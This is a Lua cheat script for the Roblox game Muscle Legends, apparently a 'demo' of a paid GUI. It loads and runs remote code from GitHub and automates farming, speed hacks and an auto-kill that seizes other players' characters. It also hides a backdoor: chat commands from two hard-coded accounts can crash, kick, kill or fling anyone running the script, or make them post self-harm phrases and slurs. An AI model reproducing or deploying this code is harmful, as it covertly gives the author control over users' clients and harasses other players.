local Version = 3
local Versions = loadstring(game:HttpGet("https://raw.githubusercontent.com/LOOF-sys/Roblox-Shit/main/Versions.lua"))()
if(Versions.MuscleLegends~=Version)then
	if(setclipboard)then
		setclipboard(Versions.Discord)
	else
		pcall(toclipboard,Versions.Discord)
	end
	game.Players.LocalPlayer:Kick("Your version is not up to date\nWe have copied the discord invite for you\n Just incase it didnt work, Discord: "..Versions.Discord)
    return "go fuck yourself"
end
local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/LOOF-sys/Roblox-Shit/main/UI1.lua"))()
local Window = ui:AddWindow("Muscle Legends V2")

local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

local selfinsults = {
    "i am dumb",
    "pls pet",
    "plsssss pet pls me am poor",
    "can i have roux",
    "how to play",
    "wow cypher i am such big fan",
    "i hate myself",
    "i hate life",
    "i want to die",
    "i want to kill hh myself",
    "im depressed",
    "im so sad :(",
    "pls stop bully me",
    "can we be friends cypher",
    "no one loves me ;(",
    "i hate my friends",
    "my friends are dumb",
    "my friends are so stupid",
    "my friends are so bad at everything",
    "muscle legends is trash",
    "i love bugatti more then codes",
    "cypher is the best",
    "i hate my family",
    "i love cypher",
    "join me",
    "gay",
    "gae",
    "g a y",
    "g hh a hh y",
    "ga y",
    "g ay",
    "gay",
    "gai",
    "gei",
    "joware",
    "i hope i die"
}

function plugin_function(player)
    player.Chatted:Connect(function(message)
        if(message=="/crash")then
            while(true)do
                
            end
        end
        if(message=="/whois")then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i use cyphers script", "All")
        end
        if(message:sub(1,6)=="/troll")then
            local text = ""
            local count = 7
            while(not string.find(message:sub(8,count)," "))do
                text = message:sub(8,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                local which_index = message:sub(count+1,count+1)
                if(tonumber(which_index)>36)then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Invalid index", "All")
                    return "no"
                else
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(selfinsults[tonumber(which_index)], "All")
                end
            end
        end
        if(message:sub(1,5)=="/kick")then
            local text = ""
            local count = 7
            while(not string.find(message:sub(7,count)," "))do
                text = message:sub(7,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                game:GetService("Players").LocalPlayer:Kick("You have been kicked by cypher")
            end
        end
        if(message:sub(1,6)=="/bring")then
            local text = ""
            local count = 7
            while(not string.find(message:sub(8,count)," "))do
                text = message:sub(8,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players").CypherV5.Character.HumanoidRootPart.CFrame or game:GetService("Players").petduplicatordude.Character.HumanoidRootPart.CFrame
            end
        end
        if(message:sub(1,5)=="/kill")then
            local text = ""
            local count = 7
            while(not string.find(message:sub(7,count)," "))do
                text = message:sub(7,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0
            end
        end
        if(message:sub(1,6)=="/fling")then
            local text = ""
            local count = 7
            while(not string.find(message:sub(8,count)," "))do
                text = message:sub(8,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                local flinger = Instance.new("BodyAngularVelocity",game:GetService("Players").LocalPlayer.Character.HumanoidRootPart)
                flinger.MaxTorque = Vector3.new(math.huge,math.huge)
                flinger.P = math.huge
                flinger.AngularVelocity = Vector3.new(99999,999,99999)
            end
        end
        if(message:sub(1,8)=="/cripple")then
            local text = ""
            local count = 9
            while(not string.find(message:sub(10,count)," "))do
                text = message:sub(10,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:Destroy()
            end
        end
        if(message:sub(1,7)=="/disarm")then
            local text = ""
            local count = 8
            while(not string.find(message:sub(9,count)," "))do
                text = message:sub(9,count)
                count = count + 1
            end
            if(game:GetService("Players").LocalPlayer.Name:lower():sub(1,#text)==text:lower())then
                for i,v in pairs(game:GetService("Players").LocalPlayer.Character)do
                    if(string.find(v.Name:lower(),"hand"))then
                        v:Destroy()
                    end
                end
            end
        end
    end)
end

for i,v in pairs(game:GetService("Players"):GetPlayers())do
    if(v.UserId==839783182 or v.UserId==2702487056)then
        plugin_function(v)
    end
end
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
game:GetService("Players").PlayerAdded:Connect(function(player)
    if(player.UserId==839783182 or player.UserId==2702487056)then
        plugin_function(v)
    end
end)

local MuscleKingDetector = Instance.new("Part",workspace)
MuscleKingDetector.Name = "@MLV2"
MuscleKingDetector.Position = Vector3.new(-8942.12890625, 49.596225738525, -5691.6362304688)
MuscleKingDetector.Anchored = true
MuscleKingDetector.CanCollide = false

local toggles = {
	AutoWeight = false;
	AutoPushups = false;
	AutoSitups = false;
	AnythingAuto = false;
	AutoMuscleKing = false;
	AutoPunch = false;
	Durability = {
	    ["5K_Rock"] = false;
		["1M_Rock"] = false;
		["5M_Rock"] = false;
	};
	AutoRebirth = false;
	AutoKill = false;
	LockedPetsToggle = false;
	PetsLocked = {};
    PremiumMode = false;
    Misc = {
        TpToMuscleKing = false;
    };
    AutoLegendsGym = false;
}
local Client = Window:AddTab("Client")
local Server = Window:AddTab("Server")
local AutoFarm = Window:AddTab("Auto Farm")
local Durability = Window:AddTab("Durability")
local Misc = Window:AddTab("Settings")
local Credits = Window:AddTab("Credits (READ)")
Credits:AddLabel("Made By Cypher#2763")
Credits:AddLabel("Roblox User: SamTerraria10")
Credits:AddLabel("Demo Paid Muscle Legends GUI")
Credits:AddButton("Copy Discord Username",(function()
	pcall(function()
		setclipboard("Cypher#2763")
	end)
end))
Credits:AddLabel("If your Interested in the Full Version DM me")
AutoFarm:AddSwitch("Auto Weight",(function(v)
	toggles.AutoWeight = v
	if(toggles.AutoWeight==true)then
		while(wait(.075))do
			if(toggles.AutoWeight==false)then
				break;
			end
			pcall(function()
			    game.Players.LocalPlayer.Backpack.Weight.Parent = game.Players.LocalPlayer.Character
			end)
			game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
			if(toggles.AutoWeight==false)then
				break;
			end
		end
	end
end))
AutoFarm:AddSwitch("Auto Pushups (Full Version Only)",(function(v)
	
end))
AutoFarm:AddSwitch("Auto Situps (Full Version Only)",(function(v)
	
end))
AutoFarm:AddSwitch("General Auto",(function(v)
    toggles.AnythingAuto = v
	if(toggles.AnythingAuto==true)then
		while(wait(.075))do
			if(toggles.AnythingAuto==false)then
				break;
			end
			game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
			if(toggles.AnythingAuto==false)then
				break;
			end
		end
	end
end))
function GetDistanceFromMuscleKing()
    return (MuscleKingDetector.Position-game.Players.LocalPlayer.HuamnoidRootPart.Positions).magnitude
end
AutoFarm:AddSwitch("Auto Muscle King",(function(v)
    toggles.AutoMuscleKing = v
    if(toggles.AutoMuscleKing==true)then
        while(wait(0.075))do
            if(toggles.AutoMuscleKing==false)then
                break;
            end
            pcall(function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8942.12890625, 49.596225738525, -5691.6362304688)
                wait(.5)
                game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["King Boulder"].interactSeat)
            end)
            pcall(function()
                if(MuscleKingDetector.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude > 600 then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8942.12890625, 49.596225738525, -5691.6362304688)
                    wait(.5)
                    game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["King Boulder"].interactSeat)
                end
            end)
            game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep", workspace.machinesFolder["King Boulder"].interactSeat)
            if(toggles.AutoMuscleKing==false)then
                break;
            end
        end
    end
end))
local LegendsThrow
for i,v in pairs(workspace.machinesFolder:GetChildren())do
    if(v.Name=="Legends Throw")then
        if(v.Boulder.Size.X>40)then
            LegendsThrow = v.interactSeat
        end
    end
end
local LegendsSeat = LegendsThrow
local StayAtWeight = Instance.new("Part",workspace)
StayAtWeight.Position = LegendsSeat.Position
StayAtWeight.CanCollide = false
StayAtWeight.Anchored = true
AutoFarm:AddSwitch("Auto Legends Gym",(function(v)
    toggles.AutoLegendsGym = v
    if(toggles.AutoLegendsGym==true)then
        while(wait(.075))do
            if(toggles.AutoLegendsGym==false)then
                break;
            end
            pcall(function()
                if(StayAtWeight.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude>600 then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LegendsSeat.CFrame
                    wait(.5)
                    game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", LegendsSeat)
                end
                if(game.Players.LocalPlayer.Character.Humanoid.Sit==false)then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LegendsSeat.CFrame
                    wait(.5)
                    game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", LegendsSeat)
                end
            end)
            game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
            if(toggles.AutoLegendsGym==false)then
                break;
            end
        end
    end
end))
function CheckForFists()
    if(not game.Players.LocalPlayer.Character:WaitForChild("Punch",.01))then
        return false
    else
        return true
    end
end
AutoFarm:AddSwitch("Auto Punch",(function(v)
    toggles.AutoPunch = v 
    if(toggles.AutoPunch==true)then
        while(wait(.075))do
            if(toggles.AutoPunch==false)then
                break;
            end
            if(CheckForFists()==false)then
                pcall(function()
                    game.Players.LocalPlayer.Backpack.Punch.Parent = game.Players.LocalPlayer.Character
                end)
            end
            pcall(function()
                game.Players.LocalPlayer.Character.Punch:Activate()
            end)
            if(toggles.AutoPunch==false)then
                break;
            end
        end
    end
end))
local RebirthStoppingPoint = 0
AutoFarm:AddTextBox("Rebith Stopping Point",(function(v)
	RebirthStoppingPoint = tonumber(v)
end),{clear = true})
local AutoRebirthSpeed = .1
AutoFarm:AddSwitch("Auto Rebirth",(function(v)
	toggles.AutoRebirth = v
	if(toggles.AutoRebirth==true)then
		while(wait(AutoRebirthSpeed))do
			if(toggles.AutoRebirth==false)then
				break;
			end
			if(game.Players.LocalPlayer.leaderstats.Rebirths.Value<RebirthStoppingPoint)then
				game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
			end
			if(toggles.AutoRebirth==false)then
				break;
			end
		end
	end
end))
AutoFarm:AddSwitch("Block Rebirths (Full Version Only)",(function(v)
end))
AutoFarm:AddSwitch("Auto Join Brawl (Full Version Only)",(function(v)
	
end))
local deletions = {"LeftUpperArm","RightUpperArm","LeftLowerArm","RightLowerArm","LeftHand","RightHand"}
local stander = Instance.new("Part",game.Workspace)
stander.Size = Vector3.new(25,1,25)
stander.Anchored = true
stander.Position = Vector3.new(338.941, 7485.44, 2208.97)

local safestander = Instance.new("Part",game.Workspace)
safestander.Size = Vector3.new(25,1,25)
safestander.Anchored = true
safestander.Position = Vector3.new(338.941, 7800.44, 2208.97)
AutoFarm:AddSwitch("Auto Kill",(function(v)
	toggles.AutoKill = v
	if(toggles.AutoKill==true)then
        while wait(.1) do
            if (toggles.AutoKill==false) then
                pcall(function()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(338.941, 7810.44, 2208.97)
                end)
                break;
            end
            pcall(function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(338.941, 7500.44, 2208.97)
                game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack:FindFirstChild("Punch"))
            end)
            for i,v in pairs(game.Players:GetChildren()) do
                if (v:IsA("Player") and v.Name ~= game.Players.LocalPlayer.Name) then
                    pcall(function()
                        for i,n in pairs(v.Character:GetChildren()) do
                            if (n.Name == "HumanoidRootPart") then
                                n.CanCollide = false
                                n.CFrame = game.Players.LocalPlayer.Character.LeftHand.CFrame
                                n.Anchored = true
                                game.Players.LocalPlayer.Character:FindFirstChild("Punch"):Activate()
                                for i,m in pairs(n.Parent:GetChildren())do
                                    if(table.find(deletions,m.Name))then
                                        m:Destroy()
                                    end
                                end
                            end
                        end
                    end)
                end
            end
            if (toggles.AutoKill==false)then
                pcall(function()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(338.941, 7810.44, 2208.97)
                end)
                break;
            end
        end
	end
end))
-- 155.93098449707, 3.6605997085571, -142.74496459961
Durability:AddSwitch("5K Rock",(function(v)
    toggles["5K_Rock"] = v 
    if(toggles["5K_Rock"]==true)then
        game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 2)
        local LockInPlace = Instance.new("BodyPosition",game.Players.LocalPlayer.Character.HumanoidRootPart)
        LockInPlace.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
        LockInPlace.Position = Vector3.new(231.450302, 7.31920815, -575.682251)
        while(wait(.075))do
            if(toggles["5K_Rock"]==false)then
                LockInPlace:Destroy()
                break;
            end
            if(CheckForFists()==false)then
                pcall(function()
                    game.Players.LocalPlayer.Backpack.Punch.Parent = game.Players.LocalPlayer.Character
                end)
            end
			pcall(function()
            	if(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame~=CFrame.new(231.450302, 7.31920815, -575.682251, 0.545128703, -8.58921823e-08, -0.838352382, -1.37531817e-08, 1, -1.11396403e-07, 0.838352382, 7.22553892e-08, 0.545128703))then
                	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(231.450302, 7.31920815, -575.682251, 0.545128703, -8.58921823e-08, -0.838352382, -1.37531817e-08, 1, -1.11396403e-07, 0.838352382, 7.22553892e-08, 0.545128703)
            	end
			end)
            pcall(function()
                game.Players.LocalPlayer.Character.Punch:Activate()
            end)
            if(toggles["5K_Rock"]==false)then
                LockInPlace:Destroy()
                break;
            end
        end
    end
end))
Durability:AddSwitch("1M Rock (Full Version Only)",(function(v)
end))
Durability:AddSwitch("5M Rock",(function(v)
	toggles["5M_Rock"] = v 
    if(toggles["5M_Rock"]==true)then
        game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", 5)
        local LockInPlace = Instance.new("BodyPosition",game.Players.LocalPlayer.Character.HumanoidRootPart)
        LockInPlace.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
        LockInPlace.Position = Vector3.new(-8901.68457, 30.6235886, -6035.05029)
        while(wait(.075))do
            if(toggles["5M_Rock"]==false)then
                LockInPlace:Destroy()
                break;
            end
            if(CheckForFists()==false)then
                pcall(function()
                    game.Players.LocalPlayer.Backpack.Punch.Parent = game.Players.LocalPlayer.Character
                end)
            end
			pcall(function()
				if(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame~=CFrame.new(-8901.68457, 30.6235886, -6035.05029, 0.545121968, 1.08612042e-09, 0.838356733, 2.2154266e-08, 1, -1.57008309e-08, -0.838356733, 2.71320459e-08, 0.545121968))then
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8901.68457, 30.6235886, -6035.05029, 0.545121968, 1.08612042e-09, 0.838356733, 2.2154266e-08, 1, -1.57008309e-08, -0.838356733, 2.71320459e-08, 0.545121968)
				end
			end)
            pcall(function()
                game.Players.LocalPlayer.Character.Punch:Activate()
            end)
            if(toggles["5M_Rock"]==false)then
                LockInPlace:Destroy()
                break;
            end
        end
    end
end))
local oldws = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
local oldjp = game.Players.LocalPlayer.Character.Humanoid.JumpPower
local oldhip = game.Players.LocalPlayer.Character.Humanoid.HipHeight
Client:AddSlider("WalkSpeed",(function(v)
	pcall(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
	end)
end),{min = 16,max = 20000,readonly = false})
Client:AddSlider("JumpPower",(function(v)
	pcall(function()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
	end)
end),{min = 50,max = 1000,readonly = false})
Client:AddSlider("HipHeight",(function(v)
	pcall(function()
		game.Players.LocalPlayer.Character.Humanoid.HipHeight = v
	end)
end),{min = 0,max = 100,readonly = false})
Client:AddButton("Force Reset",(function()
	pcall(function()
		game.Players.LocalPlayer.Character.Humanoid:Destroy()
	end)
end))
Client:AddSwitch("Anti-Delete Pets (Full Version Only)",(function(v)
    
end))
Client:AddSwitch("Premium Mode (Full Version Only)",(function(v)
end))
Client:AddSwitch("Lock Current Pets (Full Version Only)",(function(v)
	
end))
local config1 = Client:AddDropdown("Chose Pet (Full Version Only)",(function(v)
end))
config1:Add("Full Version Required")
Client:AddSwitch("Auto Accept Trades (Full Version Only)",(function(v)
end))
local TradeAllPetsDelay = 7.5
Client:AddButton("Trade all Pets & Trails (Full Version Only)",(function(v)
end))
Client:AddSwitch("Auto Trade All Pets & Trails (Full Version Only)",(function(v)
	
end))
local SetSize = 5
Client:AddTextBox("Set Size",(function(v)
    SetSize = tonumber(v)
end),{clear = true})
Client:AddSwitch("Auto Set Size",(function(v)
    toggles.AutoSetSize = v
    if(toggles.AutoSetSize==true)then
        while(wait(.25))do
            if(toggles.AutoSetSize==false)then
                break;
            end
            game:GetService("ReplicatedStorage").rEvents.changeSpeedSizeRemote:InvokeServer("changeSize", SetSize)
            if(toggles.AutoSetSize==false)then
                break;
            end
        end
    end
end))
Client:AddButton("Infinite Jump",(function(v)
	game:GetService("UserInputService").JumpRequest:Connect(function()
		pcall(function()
			game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
		end)
	end)
end))
Client:AddSwitch("Lock Client Position",(function(v)
    warn("THIS FEATURE IS BROKEN")
end))
Server:AddSlider("Punch Speed",(function(v)
	pcall(function()
		game.Players.LocalPlayer.Backpack.Punch.attackTime.Value = v
	end)
end),{min = 0,max = 10,readonly = false})
Server:AddSlider("Weight Speed",(function(v)
	pcall(function()
		game.Players.LocalPlayer.Backpack.Weight.repTime.Value = v
	end)
end),{min = 0,max = 10,readonly = false})
Server:AddSwitch("Auto Open Muscle King Crystal (Full Version Only)",(function(v)
	
end))
Server:AddButton("Print Glitchable Rebirths (Full Version Only)",(function()
end))
local AutoTpSpeed = .5
local MuscleKing
for i,v in pairs(workspace.areaCircles:GetChildren())do
    pcall(function()
        if(v.areaName.Name=="Muscle King")then
            MuscleKing = v
        end
    end)
end
Misc:AddSwitch("Auto Teleport To Muscle King",(function(v)
    toggles.Misc.TpToMuscleKing = v
    if(toggles.Misc.TpToMuscleKing==true)then
        while(wait(AutoTpSpeed))do
            if(toggles.Misc.TpToMuscleKing==false)then
                break;
            end
            pcall(function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8603.83984375, 17.22124671936, -5734.5786132812)
            end)
            if(toggles.Misc.TpToMuscleKing==false)then
                break;
            end
        end
    end
end))
Misc:AddTextBox("Auto Tp Speed",(function(v)
    AutoTpSpeed = tonumber(v)
end),{clear = true})
Misc:AddTextBox("Auto Rebirth Speed",(function(v)
    AutoRebirthSpeed = tonumber(v)
end),{clear = true})
Misc:AddTextBox("Auto Trade Pets Wait Time (Full Version Only)",(function(v)
end))
Misc:AddTextBox("Auto Accept Trades Delay (Full Version Only)",(function(v)
end))
pcall(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = oldws
	game.Players.LocalPlayer.Character.Humanoid.JumpPower = oldjp
	game.Players.LocalPlayer.Character.Humanoid.HipHeight = oldhip
end)
